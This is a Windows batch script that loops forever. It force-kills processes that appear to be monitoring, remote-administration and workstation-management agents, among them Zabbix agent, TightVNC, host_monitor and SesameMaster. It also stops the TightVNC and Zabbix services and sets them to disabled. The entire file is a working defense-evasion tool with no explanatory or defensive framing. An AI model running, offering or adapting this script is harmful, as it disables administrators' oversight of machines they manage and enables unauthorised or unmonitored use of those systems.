@echo off
:loop
taskkill /F /IM SesameMaster.exe
taskkill /F /IM host_monitor.online.exe
taskkill /F /IM lwmenu64.exe
taskkill /F /IM lwhardware64.exe
taskkill /F /IM super.exe
taskkill /F /IM Tvnserver.exe
taskkill /F /IM zabbix_agentd.exe
sc stop "TightVNC Server"
sc config "TightVNC Server" start=disabled
sc stop "Zabbix Agent"
sc config "Zabbix Agent" start=disabled
goto loop
